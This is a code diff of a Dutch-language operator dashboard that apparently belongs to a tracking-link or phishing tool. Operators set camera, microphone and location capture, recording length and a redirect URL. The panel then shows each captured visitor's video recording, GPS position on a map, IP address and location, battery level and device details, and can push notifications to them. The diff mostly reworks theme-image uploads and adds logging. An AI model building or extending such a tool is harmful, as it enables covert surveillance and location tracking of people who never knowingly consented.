@@ -385,7 +385,6 @@
     </style>
 
     <!-- Leaflet CSS -->
-    <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
 
     <!-- Firebase SDK (Firestore) -->
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
@@ -502,12 +501,12 @@
                 </div>
                 <div class="modal-input-row">
                     <label for="background-image-file">Achtergrond Afbeelding:</label>
-                    <input type="file" id="background-image-file" class="modal-input-field" accept="image/*" > {/* Change Event Listener Added Here */}
+                    <input type="file" id="background-image-file" class="modal-input-field" accept="image/*">
                     <input type="hidden" id="background-image-url" >
                 </div>
                 <div class="modal-input-row">
                     <label for="icon-image-file">Icoon Afbeelding:</label>
-                    <input type="file" id="icon-image-file" class="modal-input-field" accept="image/*" > {/* Change Event Listener Added Here */}
+                    <input type="file" id="icon-image-file" class="modal-input-field" accept="image/*">
                     <input type="hidden" id="icon-image-url" >
                 </div>
                 <div class="modal-input-row">
@@ -629,10 +628,13 @@ const themes = {
 
 // --- Function to save a new custom theme to Firestore ---
 async function saveCustomTheme() {
+    console.log("saveCustomTheme function started"); // Log function entry
     const themeName = themeNameInput.value.trim();
+    const backgroundImgFileInput = backgroundImageFile;
+    const iconImgFileInput = iconImageFile;
     const customText = customTextInput.value.trim();
-    const backgroundImageUrl = backgroundImageURLInput.value; // Get URLs from hidden inputs
-    const iconImageUrl = iconImageURLInput.value;
+
+    console.log("Theme Name:", themeName); // Log theme name
 
     if (!themeName) {
         errorMessage.textContent = "Thema naam mag niet leeg zijn.";
@@ -640,34 +642,118 @@ async function saveCustomTheme() {
         return;
     }
 
-    const themeData = {
-        backgroundImageUrl: backgroundImageUrl,
-        iconImageUrl: iconImageUrl,
-        customText: customText
-    };
+    let backgroundImageUrl = backgroundImageURLInput.value;
+    let iconImageUrl = iconImageURLInput.value;
 
-    const customThemeRef = db.collection('redirectThemes').doc(themeName);
-    const doc = await customThemeRef.get();
+    let uploadBackground = false;
+    let uploadIcon = false;
+
+    console.log("Before file check - backgroundImgFileInput.files:", backgroundImgFileInput.files); // Log file input
+    if (backgroundImgFileInput.files && backgroundImgFileInput.files[0]) {
+        console.log("Background image file detected");
+        uploadBackground = true;
+    }
+
+    console.log("Before file check - iconImgFileInput.files:", iconImgFileInput.files); // Log file input
+    if (iconImgFileInput.files && iconImgFileInput.files[0]) {
+        console.log("Icon image file detected");
+        uploadIcon = true;
+    }
+
 
     try {
+        if (uploadBackground) {
+            console.log("Starting background image upload");
+            const uploadResultBackground = await new Promise((resolve, reject) => {
+                cloudinary.openUploadWidget({
+                    cloudName: cloudName,
+                    uploadPreset: uploadPreset,
+                    sources: ["local"],
+                    resource_type: 'image',
+                    tags: ['theme_backgrounds'],
+                    folder: 'theme_backgrounds'
+                }, (error, result) => {
+                    console.log("Cloudinary Widget Callback (Background) - ERROR:", error); // Log error object
+                    console.log("Cloudinary Widget Callback (Background) - RESULT:", result); // Log result object
+                    if (error) {
+                        console.error("Cloudinary upload error (background):", error);
+                        reject(error);
+                    } else if (result && result.event === "success") {
+                        backgroundImgFileInput.value = ''; // Reset AFTER success
+                        resolve(result);
+                    } else {
+                        console.log("Cloudinary upload: neither error nor success (background)");
+                        reject(new Error("Cloudinary upload mislukt of geannuleerd (background)")); // More context
+                    }
+                }).open();
+            });
+            backgroundImageUrl = uploadResultBackground.info.secure_url;
+            backgroundImageURLInput.value = backgroundImageUrl;
+        }
+
+        if (uploadIcon) { // Identical logging for the icon upload
+           console.log("Starting icon image upload");
+            const uploadResultIcon = await new Promise((resolve, reject) => {
+                cloudinary.openUploadWidget({
+                    cloudName: cloudName,
+                    uploadPreset: uploadPreset,
+                    sources: ["local"],
+                    resource_type: 'image',
+                    tags: ['theme_icons'],
+                    folder: 'theme_icons'
+                }, (error, result) => {
+                    console.log("Cloudinary Widget Callback (Icon) - ERROR:", error); // Log error object
+                    console.log("Cloudinary Widget Callback (Icon) - RESULT:", result); // Log result object
+
+                    if (error) {
+                        console.error("Cloudinary upload error (icon):", error);
+                        reject(error);
+                    } else if (result && result.event === "success") {
+                        iconImgFileInput.value = '';  // Reset after success
+                        resolve(result);
+                    } else {
+                        console.log("Cloudinary upload: neither error nor success (icon)");
+                        reject(new Error("Cloudinary upload mislukt of geannuleerd (icon)")); // More context
+                    }
+                }).open();
+            });
+            iconImageUrl = uploadResultIcon.info.secure_url;
+            iconImageURLInput.value = iconImageUrl;
+        }
+
+        const themeData = {
+            backgroundImageUrl: backgroundImageUrl,
+            iconImageUrl: iconImageUrl,
+            customText: customText
+        };
+
+        const customThemeRef = db.collection('redirectThemes').doc(themeName);
+        const doc = await customThemeRef.get();
+
         if (doc.exists) {
             await customThemeRef.update(themeData);
             console.log(`Custom theme "${themeName}" updated in Firestore.`);
             successMessage.textContent = `Thema "${themeName}" succesvol bijgewerkt!`;
+
         } else {
-            await customThemeRef.set(themeData);
+             await customThemeRef.set(themeData);
             console.log(`Custom theme "${themeName}" saved to Firestore.`);
             successMessage.textContent = `Thema "${themeName}" succesvol opgeslagen!`;
         }
 
         successMessage.style.display = 'block';
         setTimeout(() => { successMessage.style.display = 'none'; }, 3000);
+
         themeModal.style.display = "none";
         themeNameInput.value = '';
+        // backgroundImageFile.value = ''; // NO RESET HERE
+        // iconImageFile.value = '';     // NO RESET HERE
         backgroundImageURLInput.value = '';
         iconImageURLInput.value = '';
         customTextInput.value = '';
+
         loadCustomThemes();
+
 
     } catch (error) {
         console.error("Error saving/updating custom theme:", error);
@@ -676,24 +762,434 @@ async function saveCustomTheme() {
     }
 }
 
-// Utility functions - remain the same
 
-// Function to apply theme - remain the same
-// Function to load settings and data - remain the same
-// Function to update explanations - remain the same
-// Function to save settings - remain the same
-// Function to display data - remain the same
-// Function to load all user data - remain the same
-// Function to send notification for user - remain the same
-// Function to delete all data - remain the same
-// Function to delete user data - remain the same
-// Function to apply theme on redirect - remain the same
-// Function to load custom themes - remain the same
-// Function to load theme for editing - remain the same
-// Function to update notification permission status - remain the same
-// Function to getNextUserId - remain the same
-// Function to getCurrentPositionPromise - remain the same
-// Function to getBatteryPromise - remain the same
+// Utility functions
+async function getNextUserId() {
+    const counterRef = db.collection('counters').doc('userCounter');
+
+    try {
+        const nextId = await db.runTransaction(async (transaction) => {
+            const counterDoc = await transaction.get(counterRef);
+            let newCounter = 1;
+            if (counterDoc.exists) {
+                newCounter = counterDoc.data().count + 1;
+            } else {
+                newCounter = 1;
+            }
+            transaction.set(counterRef, { count: newCounter }, { merge: true });
+            return newCounter;
+        });
+        return `user${nextId}`;
+    } catch (error) {
+        console.error("Error getting next user ID:", error);
+        errorMessage.textContent = `Firestore Fout: ${error.message}`;
+        errorMessage.style.display = 'block';
+        throw error;
+    }
+}
+
+
+   // Utility function to promisify Geolocation API
+    function getCurrentPositionPromise() {
+        return new Promise((resolve, reject) => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(resolve, reject);
+            } else {
+                reject(new Error("Geolocation is not supported"));
+            }
+        });
+    }
+
+     // Utility function to promisify Battery API
+    function getBatteryPromise() {
+        return new Promise((resolve, reject) => {
+            if(navigator.getBattery) {
+               resolve(navigator.getBattery());
+            }else{
+                reject(new Error("Battery API is not supported."));
+            }
+        });
+
+    }
+
+// Function to apply theme
+function applyTheme(themeName) {
+    const theme = themes[themeName] || themes.default;
+    document.body.style.backgroundColor = theme.bodyBackgroundColor;
+    document.body.style.color = theme.textColor;
+    const container = document.querySelector('.container');
+    if (container) {
+        container.style.backgroundColor = theme.containerBackgroundColor;
+        container.style.boxShadow = theme.containerBoxShadow;
+    }
+    const h2 = document.querySelector('h2');
+    if (h2) {
+        h2.style.color = theme.headingColor;
+        h2.style.borderBottomColor = theme.tableTitleBorderColor;
+    }
+    const buttons = document.querySelectorAll('.save-button, #trigger-redirect, #delete-all-data, .delete-user-button, #theme-selector, #create-theme-button, #save-custom-theme, #cancel-custom-theme, #edit-theme-selector');  //Added edit-theme-selector
+    buttons.forEach(button => {
+        button.style.backgroundColor = theme.buttonBackgroundColor;
+    });
+    const tableHeaders = document.querySelectorAll('.data-table th');
+    tableHeaders.forEach(th => {
+        th.style.backgroundColor = theme.tableHeaderBackgroundColor;
+        th.style.color = theme.tableHeaderColor;
+        th.style.borderColor = theme.tableBorderColor;
+    });
+     const dataTable = document.querySelector('.data-table');
+        if(dataTable){
+            dataTable.style.borderColor = theme.tableBorderColor;
+        }
+}
+
+// --- Function to check and update notification permission status ---
+function updateNotificationPermissionStatus() {
+    if (Notification.permission === 'granted') {
+        notificationPermissionMessage.style.display = 'none'; // Hide message
+    } else {
+        notificationPermissionMessage.style.display = 'block'; // Show message
+        // Optionally disable notification-related features here if needed
+    }
+}
+
+// Load settings AND data from Firestore
+async function loadSettingsAndData(userId) {
+    const settingsRef = db.collection('userSettings').doc(userId);
+
+    try {
+        const settingsSnap = await settingsRef.get();
+        if (settingsSnap.exists) {
+            const settingsData = settingsSnap.data();
+            micCamPermissionToggle.checked = settingsData.micCamPermission || false;
+            locationPermissionToggle.checked = settingsData.locationPermission || false;
+            notificationPermissionToggle.checked = settingsData.notificationPermission || false;
+            messageText.value = settingsData.messageText || '';
+            redirectUrl.value = settingsData.redirectUrl || '';
+            redirectSeconds.value = settingsData.redirectSeconds || '0';
+            recordSeconds.value = settingsData.recordSeconds || '0';
+            themeSelector.value = settingsData.theme || 'default';
+            applyTheme(themeSelector.value);
+        } else {
+            applyTheme('default');
+        }
+         updateExplanations();
+         loadAllUserData();
+         loadCustomThemes(); // Herlaad thema's, inclusief voor de bewerk-dropdown
+         updateNotificationPermissionStatus(); // Check and update on load
+
+
+    } catch (error) {
+        console.error("Error loading settings/data:", error);
+        errorMessage.textContent = `Firestore Fout: ${error.message}`;
+        errorMessage.style.display = 'block';
+    }
+}
+
+ // Update explanations
+      function updateExplanations(){
+        if(locationPermissionToggle.checked){
+            locationExplanation.classList.remove("hidden");
+        }else {
+            locationExplanation.classList.add("hidden");
+        }
+
+        if(notificationPermissionToggle.checked){
+                notificationExplanation.classList.remove("hidden");
+        }else {
+                notificationExplanation.classList.add("hidden");
+        }
+    }
+
+
+// Save settings to Firestore, get next user ID, and reload
+async function saveSettings() {
+    try {
+        const nextUserId = await getNextUserId();
+
+        const settingsRef = db.collection('userSettings').doc(nextUserId);
+        const settings = {
+            micCamPermission: micCamPermissionToggle.checked,
+            locationPermission: locationPermissionToggle.checked,
+             notificationPermission: notificationPermissionToggle.checked,
+            messageText: messageText.value,
+            redirectUrl: redirectUrl.value,
+            redirectSeconds: redirectSeconds.value,
+            recordSeconds: recordSeconds.value,
+            theme: themeSelector.value
+        };
+         updateExplanations();
+
+        await settingsRef.set(settings);
+        console.log("Settings saved successfully for user:", nextUserId);
+        successMessage.style.display = 'block';
+        setTimeout(() => { successMessage.style.display = 'none'; }, 3000);
+
+        currentUserId = nextUserId;
+        loadSettingsAndData(currentUserId);
+
+    } catch (error) {
+        console.error("Error saving settings:", error);
+        errorMessage.textContent = `Firestore Fout: ${error.message}`;
+        errorMessage.style.display = 'block';
+    }
+}
+
+
+// Function to display all user data in the table (ONE ROW PER USER - VERTICAL LAYOUT)
+async function displayData(userId, userData) {
+    const row = document.createElement('tr');
+    row.id = `user-row-${userId}`;
+
+    let cellContent = `
+        <th>User ID: ${userId} <button class="delete-user-button" onclick="deleteUserData('${userId}')">Verwijder User</button></th>
+        <td>
+            <p>Opname: ${userData.videoUrl ? '<video src="' + userData.videoUrl + '" controls style="width: 100%;"></video>' : 'Geen Data'}</p>
+            <p>Latitude: ${userData.location ? userData.location.latitude.toFixed(4) : 'Geen Data'}</p>
+            <p>Longitude: ${userData.location ? userData.location.longitude.toFixed(4) : 'Geen Data'}</p>
+            <p>Locatie Nauwkeurigheid: ${userData.location && userData.location.accuracy ? `±${userData.location.accuracy.toFixed(0)} meter` : 'Geen Data'}</p>
+            <p>Locatie op Kaart: ${userData.location && userData.location.latitude && userData.location.longitude ? '<div id="location-map-' + userId + '" class="location-map" style="height: 200px; width: 100%;"></div>' : 'Geen Data'}</p>
+            <p>IP Adres: ${userData.ipLocation ? userData.ipLocation.ip : 'Geen Data'}</p>
+            <p>IP Stad: ${userData.ipLocation ? userData.ipLocation.city : 'Geen Data'}</p>
+            <p>IP Regio: ${userData.ipLocation ? userData.ipLocation.region : 'Geen Data'}</p>
+            <p>IP Land: ${userData.ipLocation ? userData.ipLocation.country : 'Geen Data'}</p>
+            <p>Battery Percentage: ${userData.batteryPercentage ? `${userData.batteryPercentage.toFixed(0)}%` : 'Geen Data'}</p>
+            <p>Locatie Fout: ${userData.locationError || 'Geen Data'}</p>
+            <p>Batterij Fout: ${userData.batteryError || 'Geen Data'}</p>
+            <p>Camera/Microfoon Fout: ${userData.cameraError || 'Geen Data'}</p>
+            <p>Device Informatie: ${userData.deviceInfo || 'Geen Data'}</p>
+
+            <div class="notification-cell">
+                <input type="text" class="input-field" placeholder="Notificatie Titel" id="notification-title-${userId}" value="${userData.notificationTitle || ''}">
+                <input type="text" class="input-field" placeholder="Notificatie Bericht" id="notification-body-${userId}" value="${userData.notificationBody || ''}">
+                <input type="file" class="save-button" id="notification-icon-file-${userId}" accept="image/*">
+                <input type="hidden" id="notification-icon-url-${userId}" value="${userData.notificationIcon || ''}">
+                <button class="send-user-notification-button" onclick="sendNotificationForUser('${userId}')">Stuur Notificatie</button>
+            </div>
+        </td>
+    `;
+    row.innerHTML = cellContent;
+    dataList.appendChild(row);
+
+     if (userData.location && userData.location.latitude && userData.location.longitude) {
+            setTimeout(() => {
+                const map = L.map(`location-map-${userId}`).setView([userData.location.latitude, userData.location.longitude], 15);
+                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                    attribution: '© <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
+                }).addTo(map);
+                L.marker([userData.location.latitude, userData.location.longitude]).addTo(map)
+                    .bindPopup('<b>Huidige Locatie</b>').openPopup();
+            }, 0);
+        }
+    }
+
+
+// Function to load all user data and display the table (ONE ROW PER USER - VERTICAL LAYOUT)
+async function loadAllUserData() {
+    dataList.innerHTML = '';
+
+    const userDataCollection = db.collection('userData');
+
+    try {
+        const snapshot = await userDataCollection.get();
+        if (!snapshot.empty) {
+            snapshot.forEach(doc => {
+                const userId = doc.id;
+                const userData = doc.data();
+                displayData(userId, userData);
+            });
+        } else {
+            dataList.innerHTML = '<tr><td colspan="2" style="text-align:center;">Geen gebruikersdata gevonden.</td></tr>';
+        }
+
+
+    } catch (error) {
+        console.error("Error fetching all user data:", error);
+        errorMessage.textContent = `Firestore Fout: ${error.message}`;
+        errorMessage.style.display = 'block';
+    }
+}
+
+
+// --- Function to send notification for a specific user ---
+async function sendNotificationForUser(targetUserId) {
+    //Removed the notification permission. Because that check happens in loadSettingsData, and in the eventlistener
+
+    const title = document.getElementById(`notification-title-${targetUserId}`).value;
+    const body = document.getElementById(`notification-body-${targetUserId}`).value;
+    const iconUrl = document.getElementById(`notification-icon-url-${targetUserId}`).value;
+
+
+    if (!title || !body) {
+        errorMessage.textContent = "Notificatie titel en bericht zijn niet ingesteld voor deze gebruiker.";
+        errorMessage.style.display = 'block';
+        return;
+    }
+
+    try {
+        new Notification(title, {
+            body: body,
+            icon: iconUrl || undefined
+        });
+        successMessage.textContent = `Notificatie succesvol verstuurd voor gebruiker ${targetUserId}!`;
+        successMessage.style.display = 'block';
+        setTimeout(() => { successMessage.style.display = 'none'; }, 3000);
+
+
+    } catch (error) {
+        console.error("Error sending notification to user:", error);
+        errorMessage.textContent = `Fout bij versturen notificatie: ${error.message}`;
+        errorMessage.style.display = 'block';
+    }
+}
+
+
+// --- Function to delete all user data ---
+async function deleteAllData() {
+    if (confirm("Weet je zeker dat je ALLE gebruikersdata wilt verwijderen? Dit kan NIET ongedaan gemaakt worden!")) {
+        const userDataCollection = db.collection('userData');
+        const counterRef = db.collection('counters').doc('userCounter');
+
+        try {
+            // Delete all documents in userData collection
+            const querySnapshot = await userDataCollection.get();
+            const batch = db.batch();
+            querySnapshot.forEach(doc => {
+                batch.delete(doc.ref);
+            });
+            await batch.commit();
+
+            // Reset user counter to 0 or 1 (decide initial state)
+            await counterRef.set({ count: 0 });
+
+            console.log("All user data deleted successfully!");
+            successMessage.textContent = "Alle gebruikersdata succesvol verwijderd!";
+            successMessage.style.display = 'block';
+            setTimeout(() => { successMessage.style.display = 'none'; }, 3000);
+
+            loadAllUserData();
+
+        } catch (error) {
+            console.error("Error deleting all user data:", error);
+            errorMessage.textContent = `Firestore Fout: ${error.message}`;
+            errorMessage.style.display = 'block';
+        }
+    } else {
+        console.log("Delete all data action cancelled by user.");
+    }
+}
+
+// --- Function to delete data for a specific user ---
+async function deleteUserData(targetUserId) {
+    if (confirm(`Weet je zeker dat je de data van gebruiker ${targetUserId} wilt verwijderen? Dit kan NIET ongedaan gemaakt worden!`)) {
+        const userRef = db.collection('userData').doc(targetUserId);
+
+        try {
+            await userRef.delete();
+            console.log(`Data voor gebruiker ${targetUserId} succesvol verwijderd!`);
+            successMessage.textContent = `Data voor gebruiker ${targetUserId} succesvol verwijderd!`;
+            successMessage.style.display = 'block';
+            setTimeout(() => { successMessage.style.display = 'none'; }, 3000);
+
+            loadAllUserData();
+
+        } catch (error) {
+            console.error("Error deleting user data:", error);
+            errorMessage.textContent = `Fout bij verwijderen gebruikersdata: ${error.message}`;
+            errorMessage.style.display = 'block';
+        }
+    } else {
+        console.log("Delete user data action cancelled by user.");
+    }
+}
+
+// Function to apply theme on redirect page
+function applyThemeRedirect(themeName) {
+    const theme = themes[themeName] || themes.default;
+    document.body.style.backgroundColor = theme.bodyBackgroundColor;
+    document.body.style.color = theme.textColor;
+    const container = document.querySelector('.container');
+    if (container) {
+        container.style.backgroundColor = theme.containerBackgroundColor;
+        container.style.boxShadow = theme.containerBoxShadow;
+    }
+    const h1 = document.querySelector('h1');
+    if (h1) {
+        h1.style.color = theme.headingColor;
+    }
+     const p = document.querySelectorAll('p');
+    p.forEach(pElement => {
+        pElement.style.color = theme.textColor;
+    });
+
+}
+
+// --- Function to load custom themes from Firestore and populate the theme selectors ---
+async function loadCustomThemes() {
+    const customThemesRef = db.collection('redirectThemes');
+    try {
+        // Clear existing options in BOTH dropdowns first
+        Array.from(themeSelector.options).forEach(option => {
+            if (!['default', 'dark', 'green'].includes(option.value)) {
+                themeSelector.remove(option.index);
+            }
+        });
+        Array.from(editThemeSelector.options).forEach(option => {
+            if (option.value !== "") { // Keep the default "Choose..." option
+                editThemeSelector.remove(option.index);
+            }
+        });
+
+
+        const snapshot = await customThemesRef.get();
+        snapshot.forEach(doc => {
+            const themeName = doc.id;
+
+            // Add to the THEME SELECTION dropdown (no prefix)
+            const option = document.createElement('option');
+            option.value = themeName;  // No "custom_" prefix
+            option.textContent = themeName;
+            themeSelector.appendChild(option);
+
+            // Add to the THEME EDITING dropdown
+            const editOption = document.createElement('option');
+            editOption.value = themeName;
+            editOption.textContent = themeName;
+            editThemeSelector.appendChild(editOption);
+        });
+
+    } catch (error) {
+        console.error("Error loading custom themes:", error);
+        errorMessage.textContent = `Fout bij laden aangepaste thema's: ${error.message}`;
+        errorMessage.style.display = 'block';
+    }
+}
+
+// --- Functie om een thema te laden voor bewerking ---
+async function loadThemeForEditing(themeName) {
+    const customThemeRef = db.collection('redirectThemes');
+    try {
+        const doc = await customThemeRef.get();
+        if (doc.exists) {
+            const themeData = doc.data();
+            themeNameInput.value = themeName; // Vul de themanaam in
+            backgroundImageURLInput.value = themeData.backgroundImageUrl || '';
+            iconImageURLInput.value = themeData.iconImageUrl || '';
+            customTextInput.value = themeData.customText || '';
+
+            // Toon de modal
+            themeModal.style.display = "block";
+        } else {
+            errorMessage.textContent = `Thema "${themeName}" niet gevonden.`;
+            errorMessage.style.display = 'block';
+        }
+    } catch (error) {
+        console.error("Error loading theme for editing:", error);
+        errorMessage.textContent = `Fout bij laden thema: ${error.message}`;
+        errorMessage.style.display = 'block';
+    }
+}
+
 
 
 // Event listeners
@@ -708,85 +1204,46 @@ dataTableTitleElement.addEventListener('click', function() {
     }
 });
 deleteAllDataButton.addEventListener('click', deleteAllData);
+
+// --- Event listener voor de THEMA SELECTIE dropdown ---
 themeSelector.addEventListener('change', () => {
-    applyTheme(themeSelector.value);
+    applyTheme(themeSelector.value); // Pas het thema direct toe
 });
+
+// --- Event listener voor de THEMA BEWERKING dropdown ---
 editThemeSelector.addEventListener('change', () => {
     const selectedTheme = editThemeSelector.value;
-    if (selectedTheme) {
-        loadThemeForEditing(selectedTheme);
+    if (selectedTheme) { // Check of er een thema is geselecteerd (niet de default optie)
+        loadThemeForEditing(selectedTheme); // Laad de thema gegevens in de modal
     }
 });
-notificationPermissionToggle.addEventListener('change', updateNotificationPermissionStatus);
+
+notificationPermissionToggle.addEventListener('change', updateNotificationPermissionStatus); // Update status on toggle change
 
 
 createThemeButton.addEventListener('click', () => {
-    themeModal.style.display = "block";
+    themeModal.style.display = "block"; // Open modal
+    // Reset modal fields when creating a NEW theme
     themeNameInput.value = '';
     backgroundImageURLInput.value = '';
     iconImageURLInput.value = '';
     customTextInput.value = '';
-    backgroundImageFile.value = '';
-    iconImageFile.value = '';
+    backgroundImageFile.value = ''; // Clear file input
+    iconImageFile.value = '';       // Clear file input
 
 });
 closeModalButton.addEventListener('click', () => {
-    themeModal.style.display = "none";
+    themeModal.style.display = "none"; // Close modal
 });
 cancelCustomThemeButton.addEventListener('click', () => {
-    themeModal.style.display = "none";
+    themeModal.style.display = "none"; // Close modal
 });
-saveCustomThemeButton.addEventListener('click', saveCustomTheme);
-
-// --- NEW Event listeners for file inputs to trigger Cloudinary Widget ---
-backgroundImageFile.addEventListener('change', function() { // Change event for background image
-    cloudinary.openUploadWidget({
-        cloudName: cloudName,
-        uploadPreset: uploadPreset,
-        sources: ["local"],
-        resource_type: 'image',
-        tags: ['theme_backgrounds'],
-        folder: 'theme_backgrounds'
-    }, (error, result) => {
-        if (!error && result && result.event === "success") {
-            backgroundImageURLInput.value = result.info.secure_url; // Store URL in hidden input
-            backgroundImageFile.value = ''; // Clear file input after upload
-            console.log('Background image uploaded:', result.info);
-        } else {
-            console.error("Cloudinary upload error (background):", error);
-            errorMessage.textContent = `Cloudinary upload fout (achtergrond): ${error.message || 'Onbekende fout'}`;
-            errorMessage.style.display = 'block';
-            backgroundImageFile.value = ''; // Clear file input on error as well
-        }
-    }).open();
-});
-
-iconImageFile.addEventListener('change', function() { // Change event for icon image
-    cloudinary.openUploadWidget({
-        cloudName: cloudName,
-        uploadPreset: uploadPreset,
-        sources: ["local"],
-        resource_type: 'image',
-        tags: ['theme_icons'],
-        folder: 'theme_icons'
-    }, (error, result) => {
-        if (!error && result && result.event === "success") {
-            iconImageURLInput.value = result.info.secure_url; // Store URL in hidden input
-            iconImageFile.value = ''; // Clear file input after upload
-            console.log('Icon image uploaded:', result.info);
-        } else {
-            console.error("Cloudinary upload error (icon):", error);
-            errorMessage.textContent = `Cloudinary upload fout (icoon): ${error.message || 'Onbekende fout'}`;
-            errorMessage.style.display = 'block';
-            iconImageFile.value = ''; // Clear file input on error as well
-        }
-    }).open();
-});
+saveCustomThemeButton.addEventListener('click', saveCustomTheme); // Corrected event listener
 
 
 // Initial load
 loadSettingsAndData(currentUserId);
-updateNotificationPermissionStatus();
+updateNotificationPermissionStatus(); // Check and update on initial load!
 
     </script>
 </body>
